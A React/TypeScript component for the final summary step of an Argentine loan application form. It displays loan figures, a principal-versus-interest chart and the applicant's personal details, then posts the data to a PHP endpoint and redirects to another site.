import React, { useState } from 'react';
import { useFormContext } from '../context/FormContext';
import GlassMorphismCard from '../components/GlassMorphismCard';
import Button from '../components/Button';
import { Check, ChevronDown, ClipboardCheck, PieChart } from 'lucide-react';
import { statusLabels } from '../utils/constants';
import { PieChart as RechartsChart, Pie, Cell, ResponsiveContainer, Legend, Tooltip } from 'recharts';

const Step10Summary: React.FC = () => {
  const { formData, calculateMonthlyPayment, totalPayment, theme } = useFormContext();
  const [agreeToTerms, setAgreeToTerms] = useState(false);
  const [showAllDetails, setShowAllDetails] = useState(false);
  
  // Format currency function
  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('es-AR', {
      style: 'currency',
      currency: 'ARS',
      maximumFractionDigits: 0
    }).format(amount);
  };

  // Calculate loan breakdown data for the chart
  const principal = formData.loanAmount;
  const totalAmount = totalPayment();
  const interest = totalAmount - principal;

  const pieData = [
    { name: 'Capital', value: principal },
    { name: 'Intereses', value: interest }
  ];

  const COLORS = theme === 'light' 
    ? ['#8b5cf6', '#3b82f6'] 
    : ['#7c3aed', '#2563eb'];

  const handleSubmit = async () => {
    try {
      // Create form data for submission
      const formDataToSubmit = new FormData();
      formDataToSubmit.append('formData', JSON.stringify(formData));
      
      // Submit the form data to the PHP endpoint
      const response = await fetch('/save-form.php', {
        method: 'POST',
        body: formDataToSubmit
      });
      
      if (response.ok) {
        window.location.href = 'https://crediarg.webcindario.com/index.html';
      } else {
        alert('Hubo un error al enviar el formulario. Por favor, intenta nuevamente.');
      }
    } catch (error) {
      console.error('Error submitting form:', error);
      alert('Hubo un error al enviar el formulario. Por favor, intenta nuevamente.');
    }
  };

  return (
    <div className="max-w-2xl mx-auto">
      <GlassMorphismCard>
        <div className="flex items-center mb-6">
          <div className={`w-10 h-10 rounded-full flex items-center justify-center mr-3 ${theme === 'light' ? 'bg-violet-100' : 'bg-violet-900/30'}`}>
            <ClipboardCheck className={`w-5 h-5 ${theme === 'light' ? 'text-violet-600' : 'text-violet-400'}`} />
          </div>
          <h2 className={`text-2xl font-bold ${theme === 'light' ? 'text-gray-800' : 'text-white'}`}>
            Resumen de tu préstamo
          </h2>
        </div>
        
        <p className={`mb-6 ${theme === 'light' ? 'text-gray-600' : 'text-gray-300'}`}>
          Revisa la información de tu solicitud antes de finalizar. Si todo está correcto, acepta los términos y condiciones para continuar.
        </p>
        
        <div className={`p-6 rounded-xl mb-6 ${theme === 'light' ? 'bg-white/50' : 'bg-white/5'}`}>
          <h3 className={`text-xl font-bold mb-4 ${theme === 'light' ? 'text-gray-800' : 'text-white'}`}>
            Detalles del préstamo
          </h3>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="space-y-3">
              <div className="flex justify-between">
                <span className="opacity-70">Monto solicitado:</span>
                <span className="font-semibold">{formatCurrency(formData.loanAmount)}</span>
              </div>
              
              <div className="flex justify-between">
                <span className="opacity-70">Plazo:</span>
                <span className="font-semibold">{formData.loanTerm} meses</span>
              </div>
              
              <div className="flex justify-between">
                <span className="opacity-70">Cuota mensual:</span>
                <span className="font-semibold">{formatCurrency(calculateMonthlyPayment())}</span>
              </div>
              
              <div className="flex justify-between">
                <span className="opacity-70">Total a pagar:</span>
                <span className="font-semibold">{formatCurrency(totalPayment())}</span>
              </div>
            </div>
            
            <div className="h-[200px]">
              <ResponsiveContainer width="100%" height="100%">
                <RechartsChart>
                  <Pie
                    data={pieData}
                    cx="50%"
                    cy="50%"
                    innerRadius={60}
                    outerRadius={80}
                    paddingAngle={5}
                    dataKey="value"
                  >
                    {pieData.map((entry, index) => (
                      <Cell key={`cell-${index}`} fill={COLORS[index % COLORS.length]} />
                    ))}
                  </Pie>
                  <Tooltip 
                    formatter={(value: number) => formatCurrency(value)}
                    contentStyle={{
                      backgroundColor: theme === 'light' ? 'rgba(255, 255, 255, 0.9)' : 'rgba(0, 0, 0, 0.9)',
                      border: 'none',
                      borderRadius: '0.5rem',
                      padding: '0.5rem'
                    }}
                  />
                  <Legend 
                    verticalAlign="bottom" 
                    height={36}
                  />
                </RechartsChart>
              </ResponsiveContainer>
            </div>
          </div>
        </div>
        
        <div className={`p-6 rounded-xl mb-6 ${theme === 'light' ? 'bg-white/50' : 'bg-white/5'}`}>
          <h3 className={`text-xl font-bold mb-4 ${theme === 'light' ? 'text-gray-800' : 'text-white'}`}>
            Información personal
          </h3>
          
          <div className="space-y-3">
            <div className="flex justify-between">
              <span className="opacity-70">Nombre completo:</span>
              <span className="font-semibold">{formData.firstName} {formData.lastName}</span>
            </div>
            
            <div className="flex justify-between">
              <span className="opacity-70">DNI:</span>
              <span className="font-semibold">{formData.dni}</span>
            </div>
            
            <div className="flex justify-between">
              <span className="opacity-70">Provincia:</span>
              <span className="font-semibold">{formData.province}</span>
            </div>
            
            <div className="flex justify-between">
              <span className="opacity-70">Correo electrónico:</span>
              <span className="font-semibold">{formData.email}</span>
            </div>
            
            <div className="flex justify-between">
              <span className="opacity-70">Teléfono:</span>
              <span className="font-semibold">{formData.phone}</span>
            </div>
            
            <div className="flex justify-between">
              <span className="opacity-70">Situación laboral:</span>
              <span className="font-semibold">{statusLabels[formData.employmentStatus] || formData.employmentStatus}</span>
            </div>
          </div>
          
          {!showAllDetails && (
            <button 
              className={`w-full mt-4 py-2 flex items-center justify-center ${theme === 'light' ? 'text-violet-600' : 'text-violet-400'}`}
              onClick={() => setShowAllDetails(true)}
            >
              Ver más detalles <ChevronDown className="w-4 h-4 ml-1" />
            </button>
          )}
          
          {showAllDetails && (
            <div className="mt-4 pt-4 border-t border-gray-200 dark:border-gray-700">
              <h4 className={`font-medium mb-3 ${theme === 'light' ? 'text-gray-700' : 'text-gray-300'}`}>
                Información adicional:
              </h4>
              
              <div className="space-y-3">
                {Object.entries(formData.employmentQuestions).map(([key, value]) => (
                  <div key={key} className="flex justify-between">
                    <span className="opacity-70">{key}:</span>
                    <span className="font-semibold">{value}</span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
        
        <div className="mb-8">
          <label className="flex items-start cursor-pointer">
            <div className="flex items-center h-6">
              <input
                type="checkbox"
                className="w-5 h-5 rounded text-violet-600 bg-transparent border-gray-300 dark:border-gray-700 focus:ring-violet-500"
                checked={agreeToTerms}
                onChange={(e) => setAgreeToTerms(e.target.checked)}
              />
            </div>
            <span className={`ml-3 text-sm ${theme === 'light' ? 'text-gray-600' : 'text-gray-300'}`}>
              He leído y acepto los <a href="#" className="underline hover:text-violet-500">términos y condiciones</a> y la <a href="#" className="underline hover:text-violet-500">política de privacidad</a>.
            </span>
          </label>
        </div>
        
        <Button
          onClick={handleSubmit}
          disabled={!agreeToTerms}
          className="w-full justify-center"
        >
          <Check className="w-5 h-5 mr-2" /> Finalizar solicitud
        </Button>
      </GlassMorphismCard>
    </div>
  );
};

export default Step10Summary;